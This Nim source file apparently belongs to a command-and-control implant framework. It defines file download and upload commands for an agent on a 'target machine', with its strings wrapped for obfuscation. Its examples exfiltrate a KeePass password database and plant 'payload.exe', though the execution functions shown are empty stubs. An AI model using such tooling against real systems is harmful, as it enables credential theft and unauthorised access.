import ../common/[types, utils]

# Define function prototype
proc executeDownload(ctx: AgentCtx, task: Task): TaskResult
proc executeUpload(ctx: AgentCtx, task: Task): TaskResult

# Module definition
let module* = Module(
    name: protect("filetransfer"), 
    description: protect("Upload/download files to/from the target system."),
    moduleType: MODULE_FILETRANSFER,
    commands: @[
        Command(
            name: protect("download"),
            commandType: CMD_DOWNLOAD,
            description: protect("Download a file."),
            example: protect("download C:\\Users\\john\\Documents\\Database.kdbx"),
            arguments: @[
                Argument(name: protect("file"), description: protect("Path to file to download from the target machine."), argumentType: STRING, isRequired: true),
            ],
            execute: executeDownload
        ),
        Command(
            name: protect("upload"),
            commandType: CMD_UPLOAD,
            description: protect("Upload a file."),
            example: protect("upload /path/to/payload.exe"),
            arguments: @[
                Argument(name: protect("file"), description: protect("Path to file to upload to the target machine."), argumentType: BINARY, isRequired: true),
                Argument(name: protect("destination"), description: protect("Path to upload the file to. By default, uploads to current directory."), argumentType: STRING, isRequired: false),
            ],
            execute: executeUpload
        )
    ]
)

# Implement execution functions
when not defined(agent):
    proc executeDownload(ctx: AgentCtx, task: Task): TaskResult = nil
    proc executeUpload(ctx: AgentCtx, task: Task): TaskResult = nil
